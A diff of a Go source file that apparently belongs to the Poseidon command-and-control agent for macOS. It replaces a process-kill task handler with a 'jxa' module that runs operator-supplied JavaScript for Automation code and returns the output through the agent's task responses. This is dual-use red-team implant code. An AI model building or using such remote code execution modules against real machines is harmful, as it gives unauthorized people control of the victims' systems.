@@ -1,12 +1,8 @@
-package kill
+package jxa
 
 import (
 	"encoding/json"
-	"fmt"
-	"os"
-	"strconv"
 	"sync"
-	"syscall"
 
 	"github.com/xorrior/poseidon/pkg/profiles"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
@@ -14,12 +10,21 @@ import (
 
 var mu sync.Mutex
 
-//Run - Function that executes the shell command
+type JxaRun interface {
+	Success() bool
+	Result() string
+}
+
+type Arguments struct {
+	Code string `json:"code"`
+}
+
 func Run(task structs.Task) {
 	msg := structs.Response{}
 	msg.TaskID = task.TaskID
 
-	pid, err := strconv.Atoi(task.Params)
+	args := Arguments{}
+	err := json.Unmarshal([]byte(task.Params), &args)
 
 	if err != nil {
 		msg.UserOutput = err.Error()
@@ -33,8 +38,7 @@ func Run(task structs.Task) {
 		return
 	}
 
-	p, err := os.FindProcess(pid)
-
+	r, err := runCommand(args.Code)
 	if err != nil {
 		msg.UserOutput = err.Error()
 		msg.Completed = true
@@ -47,9 +51,8 @@ func Run(task structs.Task) {
 		return
 	}
 
-	p.Signal(syscall.SIGKILL)
+	msg.UserOutput = r.Result()
 	msg.Completed = true
-	msg.UserOutput = fmt.Sprintf("Killed process with PID %s", task.Params)
 	resp, _ := json.Marshal(msg)
 	mu.Lock()
 	profiles.TaskResponses = append(profiles.TaskResponses, resp)
